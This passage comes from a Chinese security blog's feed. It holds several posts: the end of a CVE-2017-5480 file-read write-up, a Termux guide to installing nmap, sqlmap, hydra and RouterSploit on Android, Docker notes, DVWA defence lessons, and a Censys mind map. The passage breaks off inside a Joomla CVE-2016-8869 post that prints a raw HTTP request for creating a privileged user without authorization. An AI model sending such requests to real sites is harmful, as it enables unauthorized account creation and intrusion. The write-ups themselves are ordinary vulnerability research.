class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $check_error = check_rename( $new_names[$loop_src_File-&gt;get_md5_ID()], $loop_src_File-&gt;is_dir(), $loop_src_File-&gt;get_dir()allow_locked_filetypes ) )</span><br><span class="line">&#123;</span><br><span class="line">$confirmed = <span class="number">0</span>;</span><br><span class="line">param_error( <span class="string">'new_names['</span>.$loop_src_File-&gt;get_md5_ID().<span class="string">']'</span>, $check_error );</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从源码<strong>由于文件扩展名限制，修改copy的文件名为*.txt才能copy成功任意文件，从而读取内容</strong>。</p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-480_read2.png" alt="读文件2"><br>Tips:</p><ul><li>文件编辑（editer）权限的用户才能成功利用</li><li>读文件时注意重命名文件为*.txt</li></ul><h2 id="0x02后记"><a href="#0x02后记" class="headerlink" title="0x02后记"></a>0x02后记</h2><p>黑盒测试+代码审计，最终成功提交第一个CVE漏洞，来张图记录一下过程</p><p><img src="http://blackwolfsec.cc/static/picture/CVE-2017-5480_sequence.png" alt="记录日志"></p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于Termux打造Android手机渗透神器（2017-7-22更新）</title>
      <link href="/2016/12/10/termux/"/>
      <url>/2016/12/10/termux/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>Termux是一款开源且不需要root，运行在Android终端上极其强大的linux模拟器，支持apt管理软件包，完美支持python,ruby,go,nodejs。本文使用termux搭建Nmap、Sqlmap、BBScan、subDomainsBrute、Hydra、RouterSploit等实现支持端口扫描、注入检测、子域名爆破、多协议弱口令爆破、路由器漏洞检测框架多种功能的Android手机渗透神器。<br><a id="more"></a></p><h2 id="0x01Termux安装及使用"><a href="#0x01Termux安装及使用" class="headerlink" title="0x01Termux安装及使用"></a>0x01Termux安装及使用</h2><p>Termux是一款开源的安卓终端Linux环境模拟器应用。<a href="https://github.com/termux/termux-app" target="_blank" rel="noopener">开源github地址</a>，<a href="https://termux.com/" target="_blank" rel="noopener">应用官网</a>，是Android手机上学习Linux使用以及Python等语言编程的绝佳利器<br>1.安装<br>官方推荐使用Google Player和F-Droid两个应用商店下载，笔者选择F-Droid提供的<a href="https://f-droid.org/repo/com.termux_42.apk" target="_blank" rel="noopener">下载地址</a>，下载后直接安装（首次打开应用会执行更新操作，需要保持手机网络畅通。）<br>2.使用技巧（参考官方<a href="https://termux.com/help.html" target="_blank" rel="noopener">帮助文档</a>）<br>（1）基本使用</p><ul><li>Termux界面长按屏幕，显示菜单项（包括返回、复制、粘贴、更多），此时屏幕出现可选择的复制光标。</li><li>Termux界面从左向右滑动，显示隐藏式导航栏，可以新建、切换、重命名会话session和调用弹出输入法</li></ul><p>（2） 常用快捷键<br>音量-键模拟（Ctrl）键<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">音量-键(Ctrl)+L                清除屏幕内容</span><br><span class="line">音量-键(Ctrl)+C                终止当前操作</span><br><span class="line">音量-键(Ctrl)D                 退出当前会话session</span><br><span class="line">音量+键+D                      Tab键（可自动补全命令或文件名）</span><br><span class="line">音量+键+W                      方向键 上（可显示前一条命令）</span><br><span class="line">音量+键+S                      方向键 下（可显示后一条命令）</span><br><span class="line">音量+键+A                      方向键 左（可左移动光标）</span><br><span class="line">音量+键+D                      方向键 右（可右移动光标）</span><br><span class="line">音量+键+Q                      显示或关闭扩展键（ESC、插入链接CTR、ALT、TAB、-、/、|以及左滑扩展键一栏可切换到全功能支持手机输入法的输入框）</span><br></pre></td></tr></table></figure></p><p>更多快捷按键参考<a href="https://termux.com/touch-keyboard.html" target="_blank" rel="noopener">官网介绍</a>，有蓝牙键盘的读者可以参考<a href="https://termux.com/hardware-keyboard.html" target="_blank" rel="noopener">硬件快捷键</a>使用<br>（3）常用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt update                    更新源</span><br><span class="line">apt search &lt;query&gt;            全文搜索可安装包</span><br><span class="line">apt install &lt;package&gt;         安装软件包</span><br><span class="line">apt upgrade                   升级软件包</span><br><span class="line">apt show  &lt;package&gt;           显示软件包的信息</span><br><span class="line">apt list [--installed]        列出所有（或已安装）的软件包信息</span><br><span class="line">apt remove &lt;package&gt;          删除软件包</span><br><span class="line">chmod                         修改文件权限</span><br><span class="line">chown                         修改文件归属</span><br></pre></td></tr></table></figure></p><h2 id="0x02打造Android手机渗透神器"><a href="#0x02打造Android手机渗透神器" class="headerlink" title="0x02打造Android手机渗透神器"></a>0x02打造Android手机渗透神器</h2><p>（1）显示扩展功能，ESC键，CTR键，TAB键（补全命令和文件名）都是很常用的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">音量+键+Q</span><br></pre></td></tr></table></figure></p><p>（2）安装基本git、wget、vim、nano、tar、zip、less等(termux下vim支持触摸移动光标移动位置)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt install git</span><br><span class="line">apt install wget</span><br><span class="line">apt install vim </span><br><span class="line">apt install nano</span><br><span class="line">apt install tar</span><br><span class="line">apt install less</span><br></pre></td></tr></table></figure></p><p>（3）安装nmap<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install nmap</span><br></pre></td></tr></table></figure></p><p>安装nmap使用方式使用</p><p><img src="http://blackwolfsec.cc/static/picture/termux_nmap.png" alt="nmap"></p><p>（4）安装python2和sqlmap<br>termux下直接安装python默认是python3.5版本（pip安装python3的扩展包），然而目前很多的软件只支持2.7+（如：sqlmap），于是安装python2,使用pip2安装python2的扩展包，本文中所有python代码均采用<code>python2 filename.py</code>运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install python2</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/termux_sqlmap_1.jpg" alt="sqlmap_1"></p><p><img src="http://blackwolfsec.cc/static/picture/termux_sqlmap_2.png" alt="sqlmap_2"><br>（5）安装whatportis<br>whatportis是一款离线查询端口号对应服务的工具<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip2 install whatportis</span><br><span class="line"><span class="comment">#使用</span></span><br><span class="line">whatportis 3306</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/termux_whatportis.png" alt="whatportis"></p><p>（6）安装BBScan和subDomainsBrute<br>安装lijiejie的BBScan扫描敏感路径和subDomainsBrute爆破子域名<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/lijiejie/</span>BBScan.git</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/y1ng1996/</span>lijiejie_subDomainsBrute.git</span><br></pre></td></tr></table></figure></p><p>提示缺失python扩展包，直接用<code>pip2 install &lt;对应扩展包&gt;</code></p><p><img src="http://blackwolfsec.cc/static/picture/termux_bbscan.jpg" alt="BBScan"></p><p><img src="http://blackwolfsec.cc/static/picture/termux_subdomainbrute.png" alt="subDomainBrute"></p><p>（7）安装openssh<br>通过手机ssh链接远程服务器进行管理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">apt install openssh</span><br><span class="line"><span class="comment">#使用</span></span><br><span class="line">ssh 用户名@主机地址</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/termux_ssh.jpg" alt="enter description here"></p><p>######################更新于2017-7-22#############################<br>（8）安装hydra<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">apt install hydra</span><br><span class="line"><span class="comment">#使用</span></span><br><span class="line">hydra -h</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/termux_hydra.jpg" alt="enter description here"></p><p>（9）安装RouterSploit<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">apt install python2</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/reverse-shell/routersploit</span><br><span class="line">pip2 install requests</span><br><span class="line"><span class="comment">#使用</span></span><br><span class="line"><span class="built_in">cd</span> routersploit</span><br><span class="line">python2 ./rsf.py</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/termux_routersploit.png" alt="enter description here"></p><h2 id="0x03结束语"><a href="#0x03结束语" class="headerlink" title="0x03结束语"></a>0x03结束语</h2><ul><li>Termux不需root即可在Android终端支持Nmap以及Ruby、Python、Go、Nodejs语言的Linux神器，安装hydra支持常见协议（SSH,FTP,Telnet,HTTP等）的弱口令爆破，使用RouterSploit实现路由器的漏洞检测与利用，同时可以根据实际需求运行相应的程序，从而打造一款属于你自己的Android终端渗透神器。</li><li>倘若拥有root权限的读者，推荐<a href="https://github.com/st42/termux-sudo" target="_blank" rel="noopener">termux sudo</a>以便更好地使用root权限</li></ul>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>涉猎Docker</title>
      <link href="/2016/12/08/docker/"/>
      <url>/2016/12/08/docker/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;初步接触Docker，记录一下安装过程和常用命令，同时安装nsenter可以十分方便地进入Docker进行管理。<br><a id="more"></a></p><h2 id="0x01实践"><a href="#0x01实践" class="headerlink" title="0x01实践"></a>0x01实践</h2><p><a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">官方安装教程</a><br><strong>1.检测操作系统内核版本</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure></p><p>返回如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-101-generic x86_64)</span><br></pre></td></tr></table></figure></p><p><strong>2.Docker安装</strong><br>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>安装对apt对https的支持和ca证书<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure></p><p>添加Docker的密钥及源文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"deb https://apt.dockerproject.org/repo ubuntu-trusty main"</span> | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure></p><p>更新Docker源并安装Docker<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-engine</span><br><span class="line">sudo service docker start <span class="comment"># 提示无此服务是执行reboot</span></span><br></pre></td></tr></table></figure></p><p><strong>3.常用命令</strong><br>搜索docker镜像<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo docker search</span></span><br></pre></td></tr></table></figure></p><p>获取ubuntu镜像 </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo docker pull ubuntu</span></span><br></pre></td></tr></table></figure><p>查看已获取docker镜像<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo docker images</span></span><br></pre></td></tr></table></figure></p><p>命令行运行docker(命名为ubuntu_test,-t -i指定命令行方式，并启动bash，输入exit退出docker)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name ubuntu_test -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure></p><p>后台运行docker,并映射端口到宿主机(后台运行tutum/lamp镜像，并把docker的80端口映射到宿主机8080,3306映射到宿主机3306,可以访问宿主机的8080端口获取docker的web服务)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 8080:80 -p 3306:3306 --name lamp_test tutum/lamp</span><br></pre></td></tr></table></figure><p>查看所有的docker(运行和停止的，并获取到docker的id和name唯一标识符)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure></p><p>已创建docker的启动、停止、重启（指定唯一标识符id或name,以ubuntu_test 为例）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start ubuntu_test </span><br><span class="line">sudo docker stop ubuntu_test </span><br><span class="line">sudo docker restart ubuntu_test</span><br></pre></td></tr></table></figure></p><p>删除docker实例（指定唯一标识符id或name,以ubuntu_test 为例）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm ubuntu_test</span><br></pre></td></tr></table></figure></p><p>删除docker镜像（指定镜像标识符，以获取的ubuntu镜像为例）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rmi ubuntu</span><br></pre></td></tr></table></figure></p><p><strong>4.安装nsenter进入docker（已过时，使用docker exec -it container_id /bin/bash）</strong><br>docker在不易后台方式运行时，退出以后docker示例就停止运行，然而后台方式运行情况下，如何进入docker内部执行相关操作就十分重要了<br>(1)安装（笔者环境为Ubuntu 14.04.5 LTS）<br>方式1.安装官方最新版<br>打开连接<a href="https://www.kernel.org/pub/linux/utils/util-linux/" target="_blank" rel="noopener">https://www.kernel.org/pub/linux/utils/util-linux/</a>选择最新版本，复制链接地址<br>下载安装文件(以2.29为例)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.kernel.org/pub/linux/utils/util-linux/v2.29/util-linux-2.29.tar.gz</span><br><span class="line">tar -zxvf util-linux-2.29.tar.gz</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">cd</span>  util-linux-2.29</span><br><span class="line">./configure --without-python --<span class="built_in">disable</span>-all-programs --<span class="built_in">enable</span>-nsenter --without-ncurses</span><br><span class="line">make nsenter</span><br><span class="line">cp nsenter /usr/<span class="built_in">local</span>/bin</span><br></pre></td></tr></table></figure><p>方式2.一键安装（使用<a href="https://github.com/jpetazzo/nsenter的docker镜像安装）" target="_blank" rel="noopener">https://github.com/jpetazzo/nsenter的docker镜像安装）</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --rm -v /usr/<span class="built_in">local</span>/bin:/target jpetazzo/nsenter</span><br></pre></td></tr></table></figure></p><p>(2)nsenter使用<br>其中container_name_or_ID修改为需要进入docker的唯一标识符id或name<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nsenter --target $(docker inspect --format \&#123;\&#123;.State.Pid\&#125;\&#125; container_name_or_ID) --mount --uts --ipc --net --pid</span><br></pre></td></tr></table></figure></p><p>以lamp_test为例，执行如下命令直接进入docker内部<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nsenter --target $(sudo docker inspect --format \&#123;\&#123;.State.Pid\&#125;\&#125; lamp_test) --mount --uts --ipc --net --pid</span><br></pre></td></tr></table></figure></p><h2 id="0x02其他"><a href="#0x02其他" class="headerlink" title="0x02其他"></a>0x02其他</h2><ul><li>docker使用nano<br>export TERM=xterm</li><li>docker挂载目录<br>docker run -it -v /home/dock/Downloads:/usr/Downloads ubuntu64 /bin/bash</li></ul>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>温故而知新-DVWA</title>
      <link href="/2016/12/08/dvwa/"/>
      <url>/2016/12/08/dvwa/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;最近涉猎docker,用docker搭建了DVWA1.9版本，正好把DVWA又重新测试一遍，记录几点安全方面的感悟<br><a id="more"></a></p><h2 id="0x01感悟"><a href="#0x01感悟" class="headerlink" title="0x01感悟"></a>0x01感悟</h2><h3 id="1-后台爆破"><a href="#1-后台爆破" class="headerlink" title="1.后台爆破"></a>1.后台爆破</h3><ul><li>通常的网站采用验证码的方式防止爆破，然而不少网站验证码过于简单，可以利用验证码识别后继续爆破，还有部分网站验证码可以重复使用，导致验证码形同虚设。</li><li>较为安全的后台防止爆破可以采用每次请求附带随机token的方式，可以防止不同的burp爆破,不过不能防止利用脚本获取页面后提交爆破。</li><li>geetest验证码通过机器学习判断是否为人为验证，然后返回一个validate，认证需要带上validate，可以防止简单的脚本爆破和burp爆破</li><li>最简单最安全的方式是错误次数限制,达到错误阈值后锁定用（ATM机取款仅仅有6位密码也是通过限制错误次数的保障用户的资金安全。）</li></ul><h3 id="2-CSRF"><a href="#2-CSRF" class="headerlink" title="2.CSRF"></a>2.CSRF</h3><ul><li>CSRF主要应用在用户已登录的情况下，通过诱骗用户点击（或者执行加载）恶意链接，向合法的应用服务以用户的身份发送请求，在缺乏防范的时候造成删除文件、添加用户、修改密码等严重后果。</li><li>一般情况通过请求携带Token的方式防止CSRF攻击，不过，当网站存在XSS时：利用XSS获取Token，然后发起CSRF请求也可能导致攻击成功。</li><li>防止此类漏洞的有效手段是请求页面带Token,并且在敏感操作时要求再次用户确认（比如输入原始密码，提醒是否确定删除。）</li></ul><h3 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3.命令注入"></a>3.命令注入</h3><ul><li>防止命令注入，主要是严格限定输入满足程序的要求，通过正则匹配满足预定输入（比如ip,必须为数字等），或者通过白名单方式限定输入</li></ul><h3 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4.文件上传"></a>4.文件上传</h3><ul><li>文件上传有通过前端限制、黑名单上传类型限制、验证文件后缀、验证文件头，关键函数过滤等多种常见的方式，然而这些方法总存在绕过的漏洞和威胁，切实有效的方法是通过白名单限制上传的文件类型并在服务器端对文件进行重命名操作。</li><li>文件包含漏洞+上传可能导致绕过上传限制机制造成攻击</li></ul><h3 id="5-SQL注入之MySQL函数CONCAT-CONCAT-WS-GROUP-CONCAT对比"><a href="#5-SQL注入之MySQL函数CONCAT-CONCAT-WS-GROUP-CONCAT对比" class="headerlink" title="5.SQL注入之MySQL函数CONCAT,CONCAT_WS,GROUP_CONCAT对比"></a>5.SQL注入之MySQL函数CONCAT,CONCAT_WS,GROUP_CONCAT对比</h3><p>(1)CONCAT(str1,str2,…)返回结果为连接参数产生的字符串,可以有一个或多个参数。如有任何一个参数为NULL ，则返回值为NULL。</p><p><img src="http://blackwolfsec.cc/static/picture/dvwa_concat.png" alt="CONCAT"></p><p>(2)CONCAT_WS(separator,str1,str2,…),返回结果为以separator为分割符的字符串,此函数会忽略参数中的NULL值(如果分割符为NULL,如：<code>select CONCAT_WS(NULL,user_id,last_name,first_name) from users;</code>则返回结果为NULL)</p><p><img src="http://blackwolfsec.cc/static/picture/dvwa_concat_ws.png" alt="CONCAT_WS"></p><p>测试CONCAT和CONCAT_WS处理NULL的区别：<br>将Bob的last_name设置为NULL以后<code>update users set last_name=NULL where user_id=5</code>，比较CONCAT和CONCAT_WS的结果,可以看到CONCAT返回为NULL,而CONCAT_WS只是忽略了NULL的字符部分，其他正常显示</p><p><img src="http://blackwolfsec.cc/static/picture/dvwa_concat_VS_concat_ws.png" alt="CONCAT VS CONCAT_WS"></p><p>(3)GROUP_CONCAT([DISTINCT] expr [,expr …][ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col …]][SEPARATOR str_val])函数返回带有来自一个组的连接的非NULL值的字符串，其中为需要将返回结果去重时使用DISTINCT，需要排序是使用ORDER BY，需要制定分割符是用SEPARATOR(默认是’,’)</p><p><img src="http://blackwolfsec.cc/static/picture/dvwa_group_concat.png" alt="GROUP_CONCAT"></p><p>将GROUP_CONCAT联合CONCAT_WS或CONCAT使用(NULL的结果已经被过滤)：</p><p><img src="http://blackwolfsec.cc/static/picture/dvwa_group_concat4concat_ws.png" alt="dvwa_group_concat4concat_ws"></p><h2 id="0x02总结"><a href="#0x02总结" class="headerlink" title="0x02总结"></a>0x02总结</h2><ul><li>白名单比黑名单安全</li><li>最小化限制输入范围（限制只能内网访问比全网访问安全，限制数字比所有字符安全，重命名比采用用户输入文件名更安全）</li></ul>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>图解censys技术框架</title>
      <link href="/2016/11/15/censys/"/>
      <url>/2016/11/15/censys/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;最近学习了<a href="https://censys.io/" target="_blank" rel="noopener">Censys</a>开源项目的相关内容，认真研读官方发布的<a href="https://censys.io/static/censys.pdf" target="_blank" rel="noopener">论文</a>，总结为思维导图分享一下。<br><a id="more"></a></p><h2 id="0x01思维导图"><a href="#0x01思维导图" class="headerlink" title="0x01思维导图"></a>0x01思维导图</h2><p><img src="/static/picture/censys.png" alt="思维导图"></p><p>&emsp;&emsp;<a href="http://blackwolfsec.cc/static/picture/censys.svg">思维导图SVG版本</a></p>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> censys </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Joomla未授权创建特权用户实践</title>
      <link href="/2016/10/28/joomla_create_user_unauthorized/"/>
      <url>/2016/10/28/joomla_create_user_unauthorized/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;近日爆出Joomla的3.4.4-3.6.3版本存在未授权创建用户漏洞CVE-2016-8869，CVE-2016-8870，测试3.6.3版本Joomla的实践中发现默认安装Joomla后,由于默认网站关闭注册功能且注册用户的激活方式是”self”即用户自己邮箱激活，实践中利用漏洞发送数据包注册账户成功却不能成功激活且不能成功登录，接下来就是问题分析及思考。<br><a id="more"></a></p><h2 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h2><ol><li><p>大致原理：<br>Joomla源码中<code>/components/com_users/controllers/registration.php</code><br><code>/components/com_users/controllers/user.php</code>两个文件皆存在用户注册函数，然而user.php中的注册函数没有检测管理员是否关闭用户注册功能，导致攻击者可以在网站关闭注册的情况下注册特权用户。</p></li><li><p>具体利用方式参考链接：<br><a href="http://paper.seebug.org/86/" target="_blank" rel="noopener">Joomla未授权创建用户漏洞（CVE-2016-8870）分析</a><br><a href="http://paper.seebug.org/88/" target="_blank" rel="noopener">Joomla未授权创建特权用户漏洞（CVE-2016-8869）分析</a></p></li></ol><p>笔者的非授权创建特权用户测试数据包格式如下（记得修改为对应的IP、cookie、token、邮箱）<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/component/users/?task=registration.register</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/index.php/component/users/?view=registration</span><br><span class="line"><span class="attribute">Cookie</span>: mycookie</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------602419586513</span><br><span class="line"><span class="attribute">Content-Length</span>: 1074</span><br><span class="line"></span><br><span class="line">-----------------------------602419586513</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[name]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123321</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[username]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123321</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[password1]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123321</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[password2]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123321</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[email1]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">testtest@qq.com</span></span><br><span class="line"><span class="attribute">-----------------------------602419586513</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="user[email2]"</span><br><span class="line"></span><br><span class="line"><span class="attribute">testtest@qq.com</span></span><br><span class="line"><span 